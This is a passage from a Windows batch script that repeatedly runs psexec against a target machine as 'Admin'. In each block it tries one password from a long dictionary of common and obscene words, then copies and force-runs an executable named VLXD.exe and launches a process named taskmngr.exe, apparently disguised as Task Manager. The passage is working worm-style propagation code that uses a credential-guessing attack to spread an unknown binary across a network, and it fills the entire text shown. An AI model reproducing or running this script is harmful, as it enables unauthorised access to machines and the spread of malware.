   psexec \\%1 -u Admin -p "network" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "network" -d taskmngr.exe
   goto end
   :Adminedu
   psexec \\%1 -u Admin -p "edu" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "edu" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "edu" -d taskmngr.exe
   psexec \\%1 -u Admin -p "edu" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "edu" -d taskmngr.exe
   goto end
   :AdminAdmin
   psexec \\%1 -u Admin -p "Admin" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "Admin" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "Admin" -d taskmngr.exe
   psexec \\%1 -u Admin -p "Admin" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "Admin" -d taskmngr.exe
   goto end
   :Adminlocal
   psexec \\%1 -u Admin -p "local" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "local" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "local" -d taskmngr.exe
   psexec \\%1 -u Admin -p "local" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "local" -d taskmngr.exe
   goto end
   :Adminremote
   psexec \\%1 -u Admin -p "remote" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "remote" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "remote" -d taskmngr.exe
   psexec \\%1 -u Admin -p "remote" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "remote" -d taskmngr.exe
   goto end
   :Adminlan
   psexec \\%1 -u Admin -p "lan" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "lan" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "lan" -d taskmngr.exe
   psexec \\%1 -u Admin -p "lan" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "lan" -d taskmngr.exe
   goto end
   :AdminAdmin
   psexec \\%1 -u Admin -p "Admin" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "Admin" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "Admin" -d taskmngr.exe
   psexec \\%1 -u Admin -p "Admin" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "Admin" -d taskmngr.exe
   goto end
   :Adminbitch
   psexec \\%1 -u Admin -p "bitch" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "bitch" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "bitch" -d taskmngr.exe
   psexec \\%1 -u Admin -p "bitch" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "bitch" -d taskmngr.exe
   goto end
   :Adminfault
   psexec \\%1 -u Admin -p "fault" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "fault" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "fault" -d taskmngr.exe
   psexec \\%1 -u Admin -p "fault" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "fault" -d taskmngr.exe
   goto end
   :Admincat
   psexec \\%1 -u Admin -p "cat" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "cat" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "cat" -d taskmngr.exe
   psexec \\%1 -u Admin -p "cat" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "cat" -d taskmngr.exe
   goto end
   :Admin911
   psexec \\%1 -u Admin -p "911" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "911" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "911" -d taskmngr.exe
   psexec \\%1 -u Admin -p "911" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "911" -d taskmngr.exe
   goto end
   :Admintowers
   psexec \\%1 -u Admin -p "towers" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "towers" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "towers" -d taskmngr.exe
   psexec \\%1 -u Admin -p "towers" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "towers" -d taskmngr.exe
   goto end
   :Admin123
   psexec \\%1 -u Admin -p "123" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "123" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "123" -d taskmngr.exe
   psexec \\%1 -u Admin -p "123" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "123" -d taskmngr.exe
   goto end
   :Admin1234
   psexec \\%1 -u Admin -p "1234" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "1234" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "1234" -d taskmngr.exe
   psexec \\%1 -u Admin -p "1234" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "1234" -d taskmngr.exe
   goto end
   :Admin12345
   psexec \\%1 -u Admin -p "12345" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "12345" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "12345" -d taskmngr.exe
   psexec \\%1 -u Admin -p "12345" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "12345" -d taskmngr.exe
   goto end
   :Admin123456
   psexec \\%1 -u Admin -p "123456" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "123456" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "123456" -d taskmngr.exe
   psexec \\%1 -u Admin -p "123456" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "123456" -d taskmngr.exe
   goto end
   :Admin654321
   psexec \\%1 -u Admin -p "654321" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "654321" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "654321" -d taskmngr.exe
   psexec \\%1 -u Admin -p "654321" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "654321" -d taskmngr.exe
   goto end
   :Admin54321
   psexec \\%1 -u Admin -p "54321" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "54321" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "54321" -d taskmngr.exe
   psexec \\%1 -u Admin -p "54321" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "54321" -d taskmngr.exe
   goto end
   :Admin321
   psexec \\%1 -u Admin -p "321" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "321" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "321" -d taskmngr.exe
   psexec \\%1 -u Admin -p "321" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "321" -d taskmngr.exe
   goto end
   :AdminAdmin
   psexec \\%1 -u Admin -p "Admin" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "Admin" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "Admin" -d taskmngr.exe
   psexec \\%1 -u Admin -p "Admin" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "Admin" -d taskmngr.exe
   goto end
   :Admin4321
   psexec \\%1 -u Admin -p "4321" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "4321" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "4321" -d taskmngr.exe
   psexec \\%1 -u Admin -p "4321" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "4321" -d taskmngr.exe
   goto end
   :Admintemp
   psexec \\%1 -u Admin -p "temp" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "temp" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "temp" -d taskmngr.exe
   psexec \\%1 -u Admin -p "temp" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "temp" -d taskmngr.exe
   goto end
   :AdminAdmin
   psexec \\%1 -u Admin -p "Admin" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "Admin" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "Admin" -d taskmngr.exe
   psexec \\%1 -u Admin -p "Admin" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "Admin" -d taskmngr.exe
   goto end
   :Adminbootie
   psexec \\%1 -u Admin -p "bootie" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "bootie" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "bootie" -d taskmngr.exe
   psexec \\%1 -u Admin -p "bootie" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "bootie" -d taskmngr.exe
   goto end
   :Adminpoop
   psexec \\%1 -u Admin -p "poop" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "poop" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "poop" -d taskmngr.exe
   psexec \\%1 -u Admin -p "poop" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "poop" -d taskmngr.exe
   goto end
   :Adminpoopie
   psexec \\%1 -u Admin -p "poopie" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "poopie" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "poopie" -d taskmngr.exe
   psexec \\%1 -u Admin -p "poopie" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "poopie" -d taskmngr.exe
   goto end
   :Adminweed
   psexec \\%1 -u Admin -p "weed" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "weed" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "weed" -d taskmngr.exe
   psexec \\%1 -u Admin -p "weed" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "weed" -d taskmngr.exe
   goto end
   :Adminwater
   psexec \\%1 -u Admin -p "water" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "water" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "water" -d taskmngr.exe
   psexec \\%1 -u Admin -p "water" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "water" -d taskmngr.exe
   goto end
   :Admincool
   psexec \\%1 -u Admin -p "cool" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "cool" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "cool" -d taskmngr.exe
   psexec \\%1 -u Admin -p "cool" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "cool" -d taskmngr.exe
   goto end
   :Adminjoint
   psexec \\%1 -u Admin -p "joint" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "joint" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "joint" -d taskmngr.exe
   psexec \\%1 -u Admin -p "joint" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "joint" -d taskmngr.exe
   goto end
   :Admincrack
   psexec \\%1 -u Admin -p "crack" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "crack" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "crack" -d taskmngr.exe
   psexec \\%1 -u Admin -p "crack" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "crack" -d taskmngr.exe
   goto end
   :Admindanger
   psexec \\%1 -u Admin -p "danger" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "danger" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "danger" -d taskmngr.exe
   psexec \\%1 -u Admin -p "danger" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "danger" -d taskmngr.exe
   goto end
   :Adminweiner
   psexec \\%1 -u Admin -p "weiner" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "weiner" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "weiner" -d taskmngr.exe
   psexec \\%1 -u Admin -p "weiner" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "weiner" -d taskmngr.exe
   goto end
   :Adminelectrical
   psexec \\%1 -u Admin -p "electrical" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "electrical" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "electrical" -d taskmngr.exe
   psexec \\%1 -u Admin -p "electrical" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "electrical" -d taskmngr.exe
   goto end
   :Adminelectric
   psexec \\%1 -u Admin -p "electric" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "electric" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "electric" -d taskmngr.exe
   psexec \\%1 -u Admin -p "electric" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "electric" -d taskmngr.exe
   goto end
   :Adminelectricity
   psexec \\%1 -u Admin -p "electricity" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "electricity" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "electricity" -d taskmngr.exe
   psexec \\%1 -u Admin -p "electricity" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "electricity" -d taskmngr.exe
   goto end
   :Adminpenis
   psexec \\%1 -u Admin -p "penis" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "penis" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "penis" -d taskmngr.exe
   psexec \\%1 -u Admin -p "penis" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "penis" -d taskmngr.exe
   goto end
   :Admincent
   psexec \\%1 -u Admin -p "cent" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "cent" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "cent" -d taskmngr.exe
   psexec \\%1 -u Admin -p "cent" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "cent" -d taskmngr.exe
   goto end
   :Admin50cent
   psexec \\%1 -u Admin -p "50cent" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "50cent" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "50cent" -d taskmngr.exe
   psexec \\%1 -u Admin -p "50cent" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "50cent" -d taskmngr.exe
   goto end
   :Admineminem
   psexec \\%1 -u Admin -p "eminem" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "eminem" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "eminem" -d taskmngr.exe
   psexec \\%1 -u Admin -p "eminem" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "eminem" -d taskmngr.exe
   goto end
   :Adminvagina
   psexec \\%1 -u Admin -p "vagina" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "vagina" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "vagina" -d taskmngr.exe
   psexec \\%1 -u Admin -p "vagina" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "vagina" -d taskmngr.exe
   goto end
   :Admincunt
   psexec \\%1 -u Admin -p "cunt" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "cunt" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "cunt" -d taskmngr.exe
   psexec \\%1 -u Admin -p "cunt" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "cunt" -d taskmngr.exe
   goto end
   :Adminpussy
   psexec \\%1 -u Admin -p "pussy" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "pussy" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "pussy" -d taskmngr.exe
   psexec \\%1 -u Admin -p "pussy" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "pussy" -d taskmngr.exe
   goto end
   :Admincock
   psexec \\%1 -u Admin -p "cock" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "cock" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "cock" -d taskmngr.exe
   psexec \\%1 -u Admin -p "cock" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "cock" -d taskmngr.exe
   goto end
   :Admindick
   psexec \\%1 -u Admin -p "dick" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "dick" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "dick" -d taskmngr.exe
   psexec \\%1 -u Admin -p "dick" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "dick" -d taskmngr.exe
   psexec \\%1 -u Admin -p dick -c -f -d VLXD.exe
   goto end
   :Adminshithead
   psexec \\%1 -u Admin -p "shithead" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "shithead" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "shithead" -d taskmngr.exe
   psexec \\%1 -u Admin -p "shithead" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "shithead" -d taskmngr.exe
   goto end
   :Adminshotgun
   psexec \\%1 -u Admin -p "shotgun" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "shotgun" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "shotgun" -d taskmngr.exe
   psexec \\%1 -u Admin -p "shotgun" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "shotgun" -d taskmngr.exe
   goto end
   :Adminblunt
   psexec \\%1 -u Admin -p "blunt" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "blunt" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "blunt" -d taskmngr.exe
   psexec \\%1 -u Admin -p "blunt" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "blunt" -d taskmngr.exe
   goto end
   :Adminglock
   psexec \\%1 -u Admin -p "glock" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "glock" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "glock" -d taskmngr.exe
   psexec \\%1 -u Admin -p "glock" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "glock" -d taskmngr.exe
   goto end
   :Adminexecutable
   psexec \\%1 -u Admin -p "executable" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "executable" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "executable" -d taskmngr.exe
   psexec \\%1 -u Admin -p "executable" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "executable" -d taskmngr.exe
   goto end
   :Adminbong
   psexec \\%1 -u Admin -p "bong" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "bong" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "bong" -d taskmngr.exe
   psexec \\%1 -u Admin -p "bong" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "bong" -d taskmngr.exe
   goto end
   :Admindildo
   psexec \\%1 -u Admin -p "dildo" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "dildo" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "dildo" -d taskmngr.exe
   psexec \\%1 -u Admin -p "dildo" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "dildo" -d taskmngr.exe
   goto end
   :Adminbaseball
   psexec \\%1 -u Admin -p "baseball" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "baseball" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "baseball" -d taskmngr.exe
   psexec \\%1 -u Admin -p "baseball" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "baseball" -d taskmngr.exe
   goto end
   :Adminbasketball
   psexec \\%1 -u Admin -p "basketball" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "basketball" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "basketball" -d taskmngr.exe
   psexec \\%1 -u Admin -p "basketball" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "basketball" -d taskmngr.exe
   goto end
   :Adminfootball
   psexec \\%1 -u Admin -p "football" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "football" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "football" -d taskmngr.exe
   psexec \\%1 -u Admin -p "football" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "football" -d taskmngr.exe
   goto end
   :Adminsoccer
   psexec \\%1 -u Admin -p "soccer" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "soccer" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "soccer" -d taskmngr.exe
   psexec \\%1 -u Admin -p "soccer" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "soccer" -d taskmngr.exe
   goto end
   :Adminpot
   psexec \\%1 -u Admin -p "pot" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "pot" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "pot" -d taskmngr.exe
   psexec \\%1 -u Admin -p "pot" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "pot" -d taskmngr.exe
   goto end
   :Admindope
   psexec \\%1 -u Admin -p "dope" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "dope" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "dope" -d taskmngr.exe
   psexec \\%1 -u Admin -p "dope" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "dope" -d taskmngr.exe
   goto end
   :Adminmaryjane
   psexec \\%1 -u Admin -p "maryjane" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "maryjane" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "maryjane" -d taskmngr.exe
   psexec \\%1 -u Admin -p "maryjane" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "maryjane" -d taskmngr.exe
   goto end
   :Adminmarijuana
   psexec \\%1 -u Admin -p "marijuana" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "marijuana" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "marijuana" -d taskmngr.exe
   psexec \\%1 -u Admin -p "marijuana" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "marijuana" -d taskmngr.exe
   goto end
   :Adminmoney
   psexec \\%1 -u Admin -p "money" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "money" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "money" -d taskmngr.exe
   psexec \\%1 -u Admin -p "money" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "money" -d taskmngr.exe
   goto end
   :Admingirl
   psexec \\%1 -u Admin -p "girl" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "girl" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "girl" -d taskmngr.exe
   psexec \\%1 -u Admin -p "girl" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "girl" -d taskmngr.exe
   goto end
   :Admingirls
   psexec \\%1 -u Admin -p "girls" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "girls" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "girls" -d taskmngr.exe
   psexec \\%1 -u Admin -p "girls" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "girls" -d taskmngr.exe
   goto end
   :Adminwoman
   psexec \\%1 -u Admin -p "woman" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "woman" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "woman" -d taskmngr.exe
   psexec \\%1 -u Admin -p "woman" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "woman" -d taskmngr.exe
   goto end
   :Adminwomen
   psexec \\%1 -u Admin -p "women" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "women" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "women" -d taskmngr.exe
   psexec \\%1 -u Admin -p "women" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "women" -d taskmngr.exe
   goto end
   :Adminfemale
   psexec \\%1 -u Admin -p "female" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "female" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "female" -d taskmngr.exe
   psexec \\%1 -u Admin -p "female" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "female" -d taskmngr.exe
   goto end
   :Adminamerica
   psexec \\%1 -u Admin -p "america" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "america" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "america" -d taskmngr.exe
   psexec \\%1 -u Admin -p "america" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "america" -d taskmngr.exe
   goto end
   :Adminusa
   psexec \\%1 -u Admin -p "usa" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "usa" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "usa" -d taskmngr.exe
   psexec \\%1 -u Admin -p "usa" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "usa" -d taskmngr.exe
   goto end
   :Admingod
   psexec \\%1 -u Admin -p "god" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "god" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "god" -d taskmngr.exe
   psexec \\%1 -u Admin -p "god" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "god" -d taskmngr.exe
   goto end
   :Adminjesus
   psexec \\%1 -u Admin -p "jesus" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "jesus" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "jesus" -d taskmngr.exe
   psexec \\%1 -u Admin -p "jesus" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "jesus" -d taskmngr.exe
   goto end
   :Admincomputer
   psexec \\%1 -u Admin -p "computer" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "computer" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "computer" -d taskmngr.exe
   psexec \\%1 -u Admin -p "computer" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "computer" -d taskmngr.exe
   goto end
   :Admintechnology
   psexec \\%1 -u Admin -p "technology" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "technology" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "technology" -d taskmngr.exe
   psexec \\%1 -u Admin -p "technology" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "technology" -d taskmngr.exe
   goto end
   :Adminporn
   psexec \\%1 -u Admin -p "porn" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "porn" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "porn" -d taskmngr.exe
   psexec \\%1 -u Admin -p "porn" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "porn" -d taskmngr.exe
   goto end
   :Adminhack
   psexec \\%1 -u Admin -p "hack" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "hack" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "hack" -d taskmngr.exe
   psexec \\%1 -u Admin -p "hack" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "hack" -d taskmngr.exe
   goto end
   :Adminclock
   psexec \\%1 -u Admin -p "clock" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "clock" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "clock" -d taskmngr.exe
   psexec \\%1 -u Admin -p "clock" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "clock" -d taskmngr.exe
   goto end
   :Adminchurch
   psexec \\%1 -u Admin -p "church" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "church" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "church" -d taskmngr.exe
   psexec \\%1 -u Admin -p "church" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "church" -d taskmngr.exe
   goto end
   :Admintemp
   psexec \\%1 -u Admin -p "temp" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Admin -p "temp" -f -c -d VLXD.exe -o
   psexec \\%1 -u Admin -p "temp" -d taskmngr.exe
   psexec \\%1 -u Admin -p "temp" -d VLXD.exe -o
   psexec \\%1 -u Admin -p "temp" -d taskmngr.exe
   goto end
   :end
